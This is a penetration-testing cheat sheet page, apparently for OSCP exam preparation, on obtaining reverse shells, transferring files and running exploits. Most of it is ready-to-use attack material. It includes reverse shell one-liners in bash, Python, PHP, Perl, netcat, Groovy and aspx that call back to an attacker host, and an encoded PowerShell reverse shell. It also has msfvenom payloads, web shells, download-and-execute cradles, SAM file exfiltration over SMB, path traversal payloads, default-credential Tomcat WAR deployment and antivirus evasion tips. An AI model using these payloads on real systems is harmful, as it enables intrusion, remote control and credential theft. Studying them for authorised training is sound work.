---
title: "Shells & Transfers"
date: 2026-06-20
weight: 60
draft: false
summary: "The basic workflow from getting a shell and stabilizing it to transferring files and running exploits."
---

Reference for getting shells, transferring files, and running exploit workflows.

- Source: https://heretek.dev/oscp-cheatsheet/shells-and-transfers/ (Jean Romero) — reconstructed
- Variables: `$TARGET` = target host, `$KALI` = attacker (Kali) IP (`ATTACKER` and `YOUR_IP` in the body are also the attacker IP)

## Searchsploit and the exploit workflow

### Finding exploits

```bash
searchsploit <service> <version>        # exact match
searchsploit <service>                  # broader — when the exact version finds nothing
searchsploit -m <exploit-path>          # copy the exploit to the current directory
searchsploit -p <exploit-id>            # show full path
searchsploit -u                         # update the DB
```

Tip: start broad and narrow down. If `Apache 2.4.49` finds nothing, try `Apache 2.4`. Always also search Google: `<service> <version> exploit github`.

### Checks before running

- Read the code — understand what it does
- Check the variables — look for hardcoded IPs, ports, paths, and usernames at the top
- Check the target — make sure the exact version and architecture (32/64-bit) match
- Start your listener before running
- If the exploit fails — read the error output, check the architecture, try another PoC from GitHub

### Compiling exploits

```bash
# C for Linux
gcc exploit.c -o exploit
gcc -m32 exploit.c -o exploit            # 32-bit
gcc exploit.c -o exploit -static         # static (no dependency problems on the target)

# C for Windows (cross-compile on Kali)
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe       # 64-bit
i686-w64-mingw32-gcc exploit.c -o exploit.exe          # 32-bit
# Network exploits that use Winsock (socket, connect, send, recv) need -lws2_32:
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
# If you get undefined reference errors for WSAStartup/socket/connect → add -lws2_32

# Python — just run it
python3 exploit.py
pip install <missing-module>             # if dependencies are missing
```

## Reverse shells

### Windows PowerShell one-liner (best method)

1. Get PowerShell #2 from revshells.com — it's important to copy only the unquoted part (marked "copy this")
2. Go to cyberchef.com
3. Paste in the reverse shell you want to use
4. Choose 'encode text' and set Encoding to 'UTF-16LE (1200)'
5. Encode as base64
6. Copy the output and paste it

Start the listener first:

```bash
rlwrap nc -lvnp 4444           # basic (rlwrap enables arrow keys)

# Socat stable TTY (best-quality shell if socat is on the target)
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444
```

### Reverse shell from MSSQL (best method)

```text
SQL (SIGNED\Administrator dbo@master)> EXEC xp_cmdshell 'powershell -exec -bypass -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAzADcAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

> The encoded PowerShell example above embeds a hardcoded IP (10.10.14.237). Regenerate it with your own Kali IP before use.

### Linux shells

```bash
bash -c 'bash -i >& /dev/tcp/$KALI/4444 0>&1'

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $KALI 4444 >/tmp/f

# Perl
perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Windows shell — step by step (try in this order)

Golden rule: don't fight quoting. Upload the file and run it. `C:\Windows\Temp\` always exists. `C:\Temp\` often doesn't. If 4444 is blocked, use 80 or 443 — firewalls usually leave web ports open.

Step 1: upload nc.exe (pick one method)

```bash
# From Kali — host nc.exe
cp /usr/share/windows-resources/binaries/nc.exe . && python3 -m http.server 80

# On the target — download (try in order until one works)
certutil -urlcache -f http://YOUR_IP/nc.exe C:\Windows\Temp\nc.exe
powershell -c "curl http://YOUR_IP/nc.exe -o C:/Windows/Temp/nc.exe"
powershell -c "(New-Object Net.WebClient).DownloadFile('http://YOUR_IP/nc.exe','C:\Windows\Temp\nc.exe')"
```

Step 2: listener on Kali

```bash
rlwrap nc -nlvp 80
# If 4444 is blocked, use 80 or 443
```

Step 3: run nc.exe on the target

```bash
C:\Windows\Temp\nc.exe YOUR_IP 80 -e cmd.exe
```

If nc.exe doesn't work, use PowerShell base64 (no quoting issues):

```bash
# On Kali — generate base64-encoded reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=80 -f psh -o shell.ps1
cat shell.ps1 | iconv -t UTF-16LE | base64 -w 0

# copy the output
# On target — run (one-line string, no quoting that can break)
powershell -e <BASE64>
```

If you need a PowerShell download cradle:

```bash
# quoting pattern: outer single quotes, inner double quotes
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')"
```

When injecting into a Python/Ruby exploit (-c flag):

```bash
# WRONG — Windows has no bash
-c "bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'"

# RIGHT — use PowerShell base64 (no quoting conflicts)
-c 'powershell -e <BASE64>'

# RIGHT — use nc.exe (no quoting conflicts)
-c 'C:\Windows\Temp\nc.exe YOUR_IP 80 -e cmd.exe'

# RIGHT — download then execute (outer single quotes, inner double quotes)
-c 'powershell -c "curl http://YOUR_IP/nc.exe -o C:/Windows/Temp/nc.exe"'
-c 'C:\Windows\Temp\nc.exe YOUR_IP 80 -e cmd.exe'
```

If AV catches the payload:

- msfvenom psh payload → Defender catches it easily
- nc.exe → usually not caught
- msfvenom exe → sometimes caught → try the exe-service or use the Metasploit handler
- Metasploit → use exploit/multi/handler (check the current OffSec exam rules before relying on it)

Windows shell decision tree:

```text
Do you need a Windows reverse shell?
│
├── Can you upload files?        → nc.exe (always start here)
│
├── Can you run PowerShell?      → powershell -e <BASE64>
│
├── Injecting via an exploit?    → -c 'powershell -e <BASE64>'
│                              → or: -c 'C:\Windows\Temp\nc.exe IP PORT -e cmd'
│
├── Does AV block everything?    → Metasploit handler (when permitted by the exam rules)
│
└── Port blocked?                → use 80 or 443 instead of 4444
```

Hard-learned lessons:

1. `C:\Temp` may not exist. `C:\Windows\Temp` always does.
2. If 4444 is blocked, try 80 or 443.
3. If certutil is blocked: `powershell -c "curl http://IP/file -o C:/Windows/Temp/file"`
4. The msfvenom psh payload gets caught by AV. nc.exe usually doesn't.
5. Quoting: outer single quotes, inner double quotes.
6. Windows has no /bin/bash. Don't inject Linux payloads into Windows exploits.

### msfvenom payload matrix

- Linux ELF: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f elf -o shell.elf`
- Windows EXE: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o shell.exe`
- Windows DLL: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll -o shell.dll`
- MSI: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi -o shell.msi`
- ASP: `msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f asp -o shell.asp`
- ASPX: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f aspx -o shell.aspx`
- JSP: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f raw -o shell.jsp`
- WAR: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f war -o shell.war`
- PHP: `msfvenom -p php/reverse_php LHOST=ATTACKER LPORT=4444 -f raw -o shell.php`
- HTA: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f hta-psh -o shell.hta`
- nc.exe alternative: `C:\temp\nc.exe ATTACKER 4444 -e cmd.exe`

### Groovy reverse shell (Jenkins Script Console)

```text
String host="ATTACKER";int port=4444;String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();
```

On a Linux Jenkins, replace cmd.exe with /bin/bash.

### Tomcat WAR shell deployment

If you have Tomcat Manager credentials (try tomcat:s3cret, admin:admin):

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f war -o shell.war
curl -u 'tomcat:s3cret' --upload-file shell.war "http://$ip:8080/manager/text/deploy?path=/shell"
curl http://$ip:8080/shell/    # trigger the reverse shell
```

### Web shells

PHP:

```text
<?php system($_GET['cmd']); ?>
```

ASP:

```text
<% Set o = Server.CreateObject("WSCRIPT.SHELL") : Set x = o.exec("cmd /c " & Request("cmd")) : Response.Write x.StdOut.ReadAll %>
```

JSP:

```text
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

### Shell upgrade (Linux — immediately after landing)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Ctrl+Z (to background)
stty raw -echo; fg

# Press Enter twice
export TERM=xterm-256color
stty rows 50 cols 200
```

Windows: when receiving a shell, use `rlwrap nc -lvnp 4444`.

## File transfer

### Linux target

```bash
# HTTP (most common — attacker: python3 -m http.server 80)
wget http://ATTACKER/file -O /tmp/file
curl http://ATTACKER/file -o /tmp/file

# Execute without writing to disk
curl http://ATTACKER/linpeas.sh | bash

# When wget/curl is unavailable
cat < /dev/tcp/ATTACKER/80 > file.txt

# Netcat (attacker: nc -lvnp 9999 < file)
nc ATTACKER 9999 > file

# SCP (when you have SSH access)
scp user@ATTACKER:/path/file /tmp/file
```

### Windows target

```bash
certutil -urlcache -split -f http://ATTACKER/file.exe C:\Users\Public\file.exe

# PowerShell
iwr -uri http://ATTACKER/file.exe -outfile file.exe
(New-Object System.Net.WebClient).DownloadFile('http://ATTACKER/file.exe','C:\Users\Public\file.exe')

# Execute directly from memory (PowerShell)
IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKER/script.ps1')

# Bitsadmin (when certutil/PS are blocked)
bitsadmin /transfer job /download /priority high http://ATTACKER/file.exe C:\Users\Public\file.exe
```

### SSH connection troubleshooting (ARM64 Kali / Parallels)

If SSH hangs during key exchange (debug shows "expecting SSH2_MSG_KEX_ECDH_REPLY"):

```bash
# Fix: force a different key exchange algorithm
ssh -i key user@target -p PORT -o KexAlgorithms=curve25519-sha256

# If the shell hangs after login, force an interactive bash
ssh -i key user@target -p PORT -o KexAlgorithms=curve25519-sha256 -t "bash -i"

# Combined: port forwarding + normal shell + kex fix
ssh -i key user@target -p PORT -o KexAlgorithms=curve25519-sha256 -t "bash -i" -L 8080:127.0.0.1:8080
```

### SMB server (best for Windows — both upload and download)

Always add `-user` and `-password`. Modern Windows (Win10/11, Server 2019+) blocks anonymous SMB — 'organization's policies block unauthenticated guest access'. Anonymous SMB without credentials fails silently or throws an error.

If `net use` also fails, reverse the transfer direction: run `python3 -m http.server 8888` on the Windows target and download from Kali with `wget`.

```bash
# Attacker:
impacket-smbserver smb $(pwd) -smb2support -user test -password test

# Windows target:
net use \\$KALI\smb /user:test test
copy \\$KALI\smb\file.exe .
copy C:\sam \\$KALI\smb\sam    # exfiltrate
net use \\ATTACKER\smb /delete
```

### Base64 transfer (when everything else is blocked)

```bash
# On Kali: encode
base64 -w 0 file.bin | xclip -selection clipboard

# On Linux target: decode
echo 'BASE64STRING' | base64 -d > file.bin

# On Windows target: decode (PowerShell)
[IO.File]::WriteAllBytes("C:\temp\file.exe",[Convert]::FromBase64String("BASE64STRING"))
```

## Port scanning from a pivot host (when nmap isn't available)

### From Windows

```powershell
# Single port test
Test-NetConnection -Port 445 10.10.10.5

# Scan common ports on a host
@(21,22,80,135,139,445,1433,3389,5985) | % { $r = Test-NetConnection 10.10.10.5 -Port $_ -WarningAction SilentlyContinue; if($r.TcpTestSucceeded){"Port $_ OPEN"} }

# Sweep a subnet for a specific port
1..254 | % { Test-NetConnection "10.10.10.$_" -Port 445 -WarningAction SilentlyContinue -InformationLevel Quiet }
```

### From Linux (no tools)

```bash
# Bash TCP scan
for port in 21 22 80 443 445 3389 5985; do (echo >/dev/tcp/10.10.10.5/$port) 2>/dev/null && echo "Port $port OPEN"; done

# Ping sweep
for i in $(seq 1 254); do (ping -c 1 -W 1 10.10.10.$i | grep "bytes from" &); done; wait
```

## Fixing Python2 exploits for Python3

Most searchsploit exploits are Python2. In Python3 they'll almost always crash. Quick fixes:

- `print "hello"` → `print("hello")` — print becomes a function
- `print "Status: %s" % var` → `print("Status: %s" % var)` — just add parentheses
- `raw_input("Enter: ")` → `input("Enter: ")` — raw_input is removed
- `except Exception, e:` → `except Exception as e:` — comma syntax is removed
- `urllib2.urlopen(url)` → `urllib.request.urlopen(url)` — urllib2 merged into urllib
- `"string" + bytes_var` → `"string" + bytes_var.decode()` — str and bytes are separate types
- `socket.send("cmd")` → `socket.send(b"cmd")` — sockets take bytes, not str
- `data = "A" * 100` (exploit buffer) → `data = b"A" * 100` — use `b""` for binary payloads
- `xrange(100)` → `range(100)` — xrange is removed
- `dict.iteritems()` → `dict.items()` — iteritems is removed
- `dict.has_key('x')` → `'x' in dict` — has_key is removed

Quick fix workflow:

```bash
# Step 1: just run it first
python3 exploit.py 2>&1 | head -5

# Step 2: if you get a SyntaxError on print, quickly fix it with sed
sed -i 's/^\(\s*\)print \(.*\)$/\1print(\2)/' exploit.py
# ⚠️ handles most cases, but always verify the result — complex prints may need manual fixes

# Step 3: if you really need Python2 and the fixes are too extensive
# Kali has Python2 or install it:
sudo apt install python2
python2 exploit.py
```

Last resort: if the fixes are too messy, search GitHub for a Python3 rewrite: `<CVE number> python3 exploit github`

## Shell discipline (important on the exam)

### Problem

Blocking reverse shells (pentestmonkey, Ivan Sincek PHP shells) can freeze the web server. If you trigger one from a browser and the connection doesn't close cleanly, the PHP process holds an Apache worker forever. With 10 prefork MPM workers, 10 failed shells freeze all the workers in T state. Only an administrator can kill them.

### Rules

- Don't trigger reverse shells from a browser — use curl
- Prefer a command executor + background shell over blocking shells
- If the shell dies, type `exit` in nc instead of Ctrl+C
- If the first attempt didn't return, don't hit the same shell URL twice
- Stabilize the shell immediately once you catch it

### Preferred pattern: command executor + background shell

Drop a tiny non-blocking PHP shell: `<?php system($_GET['cmd']); ?>`

Trigger the reverse shell with curl, with `&` appended to background it:

```text
curl 'http://TARGET/cmd.php?cmd=nohup+bash+-c+%22bash+-i+%3E%26+/dev/tcp/KALI/4444+0%3E%261%22+%26'
```

The trailing `&` detaches from the Apache worker. The worker returns immediately, and the shell runs as an independent process.

Trigger examples:

```text
curl -s http://$TARGET/request.php
curl -s "http://$TARGET/index.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
curl -s "http://$TARGET/index.php?file=….//….//….//etc/passwd"
curl -sG "http://$TARGET/index.php" \
  --data-urlencode "file=simple_shell.php" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$KALI/443 0>&1'"
curl -sG "http://$TARGET/index.php" \
  --data-urlencode "file=simple_shell.php" \
  --data-urlencode "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$KALI",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'"
curl -sG "http://$TARGET/index.php" \
  --data-urlencode "file=simple_shell.php" \
  --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $KALI 443 >/tmp/f"
```

### Windows (aspx)

One-line aspx command executor:

```text
<%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["c"]){RedirectStandardOutput=true,UseShellExecute=false}).StandardOutput.ReadToEnd()); %>
```

Trigger:

```text
curl 'http://TARGET/shell.aspx?c=whoami'
```

Then download nc.exe and upgrade to a real shell:

```text
curl 'http://TARGET/shell.aspx?c=powershell+-c+iwr+http://KALI/nc.exe+-o+C:\Windows\Temp\nc.exe'
curl 'http://TARGET/shell.aspx?c=C:\Windows\Temp\nc.exe+KALI+4444+-e+cmd.exe'
```

### Stabilizing after catching a shell

Linux:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Ctrl+Z
stty raw -echo; fg

export TERM=xterm SHELL=bash

# rows/cols reset: stty rows 50 cols 200
```

Windows: if you have credentials, use evil-winrm or RDP. Live with raw nc shell limitations or upgrade to powershell.

- Symptom: Apache is listening on 80 but requests hang. ps shows several httpd workers in T state.
- Cause: blocking PHP reverse shells piled up, each holding one worker.
- Recovery: killing processes requires root. If you don't have root, revert the box.
- Prevention: use the command executor pattern above. After backgrounding, the worker returns immediately.
